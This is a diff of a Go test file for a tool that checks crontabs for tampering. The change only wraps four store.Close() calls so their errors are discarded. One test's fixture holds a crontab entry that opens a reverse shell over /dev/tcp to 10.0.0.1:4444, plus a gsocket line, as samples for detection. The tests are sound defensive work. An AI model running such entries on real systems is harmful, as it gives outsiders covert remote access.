@@ -1045,7 +1045,7 @@ func TestCheckCrontabs_RootCrontabModified(t *testing.T) {
 	if err != nil {
 		t.Fatal(err)
 	}
-	defer store.Close()
+	defer func() { _ = store.Close() }()
 
 	withMockOS(t, &mockOS{
 		glob: func(pattern string) ([]string, error) {
@@ -1094,7 +1094,7 @@ func TestCheckCrontabs_CronDFileModified(t *testing.T) {
 	if err != nil {
 		t.Fatal(err)
 	}
-	defer store.Close()
+	defer func() { _ = store.Close() }()
 
 	withMockOS(t, &mockOS{
 		glob: func(pattern string) ([]string, error) {
@@ -1149,7 +1149,7 @@ func TestCheckCrontabs_MultipleSuspiciousPatterns(t *testing.T) {
 	if err != nil {
 		t.Fatal(err)
 	}
-	defer store.Close()
+	defer func() { _ = store.Close() }()
 
 	content := "* * * * * bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n" +
 		"0 * * * * gsocket --help\n"
@@ -1178,7 +1178,7 @@ func TestCheckCrontabs_ReadError(t *testing.T) {
 	if err != nil {
 		t.Fatal(err)
 	}
-	defer store.Close()
+	defer func() { _ = store.Close() }()
 
 	withMockOS(t, &mockOS{
 		glob: func(pattern string) ([]string, error) {
